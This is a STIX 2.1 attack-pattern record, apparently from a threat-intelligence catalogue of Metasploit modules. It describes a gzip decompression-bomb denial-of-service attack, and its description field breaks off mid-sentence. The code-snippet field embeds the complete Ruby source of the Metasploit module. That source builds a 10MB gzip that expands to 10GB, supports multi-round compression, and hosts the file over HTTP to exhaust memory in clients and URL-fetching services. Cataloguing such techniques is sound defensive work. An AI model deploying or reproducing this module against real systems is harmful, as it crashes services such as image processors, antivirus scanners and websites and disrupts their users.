{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--694a7414-9759-46f3-a3fb-6d5ad8853409",
    "created": "2024-08-14T16:26:24.467Z",
    "modified": "2024-08-14T16:26:24.467004Z",
    "name": "Gzip Memory Bomb Denial Of Service",
    "description": " This module generates and hosts a 10MB single-round gzip file that decompresses to 10GB. Many applications will not implement a length limit check and will eat up all memory and eventually die. This can also be used to kill systems that download/parse content from",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/gzip_bomb_dos.rb",
            "external_id": "gzip_bomb_dos.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.aerasec.de/security/advisories/decompression-bomb-vulnerability.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\nrequire 'stringio'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Gzip Memory Bomb Denial Of Service',\n      'Description'    => %q{\n        This module generates and hosts a 10MB single-round gzip file that decompresses to 10GB.\n        Many applications will not implement a length limit check and will eat up all memory and\n        eventually die. This can also be used to kill systems that download/parse content from\n        a user-provided URL (image-processing servers, AV, websites that accept zipped POST data, etc).\n\n        A FILEPATH datastore option can also be provided to save the .gz bomb locally.\n\n        Some clients (Firefox) will allow for multiple rounds of gzip. Most gzip utils will correctly\n        deflate multiple rounds of gzip on a file. Setting ROUNDS=3 and SIZE=10240 (default value)\n        will generate a 300 byte gzipped file that expands to 10GB.\n      },\n      'Author'         =>\n        [\n          'info[at]aerasec.de', # 2004 gzip bomb advisory\n          'joev'                # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.aerasec.de/security/advisories/decompression-bomb-vulnerability.html' ]\n        ],\n      'DisclosureDate' => '2004-01-01',\n      'Actions'     =>\n        [\n          [ 'WebServer', 'Description' => 'Host file via web server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'WebServer'\n        ],\n      'DefaultAction'  => 'WebServer'))\n\n    register_options(\n      [\n        OptInt.new('SIZE', [true, 'Size of uncompressed data in megabytes (10GB default).', 10240]),\n        OptInt.new('ROUNDS', [true, 'Rounds of gzip compression. Some applications (FF) support > 1.', 1]),\n        OptString.new('URIPATH', [false, 'Path of URI on server to the gzip bomb (default is random)']),\n        OptString.new('CONTENT_TYPE', [false, 'Content-Type header to serve in the response', 'text/html'])\n      ],\n    self.class)\n  end\n\n  def run\n    datastore['HTTP::compression'] = false # not a good idea\n    @gzip = generate_gzip\n    print_status \"Gzip generated. Uncompressed=#{default_size}bytes. Compressed=#{@gzip.length}bytes.\"\n    exploit # start http server\n  end\n\n  def on_request_uri(cli, request)\n    print_status \"Sending gzipped payload to client #{cli.peerhost}\"\n    rounds = (['gzip']*datastore['ROUNDS']).join(', ')\n    send_response(cli, @gzip, { 'Content-Encoding' => rounds, 'Content-Type' => datastore['CONTENT_TYPE'] })\n  end\n\n  # zlib ftw\n  def generate_gzip(size=default_size, blocks=nil, reps=nil)\n    reps ||= datastore['ROUNDS']\n    return blocks if reps < 1\n\n    print_status \"Generating gzip bomb...\"\n    StringIO.open do |io|\n      stream = Zlib::GzipWriter.new(io, Zlib::BEST_COMPRESSION, Zlib::DEFAULT_STRATEGY)\n      buf = nil\n      begin\n        # add MB of data to the stream. this takes a little while, but doesn't kill memory.\n        if blocks.nil?\n          chunklen = 1024*1024*8 # 8mb per chunk\n          a = \"A\"*chunklen\n          n = size / chunklen\n\n          n.times do |i|\n            stream << a\n            if i % 100 == 0\n              print_status \"#{i.to_s.rjust(Math.log(n,10).ceil)}/#{n} chunks added (#{'%.1f' % (i.to_f/n.to_f*100)}%)\"\n            end\n          end\n        else\n          stream << blocks\n        end\n\n        a = nil # gc a\n        buf = generate_gzip(size, io.string, reps-1)\n      ensure\n        stream.flush\n        stream.close\n      end\n      buf\n    end\n  end\n\n  def default_size\n    datastore['SIZE']*1024*1024 # mb -> bytes\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2004-01-01"
}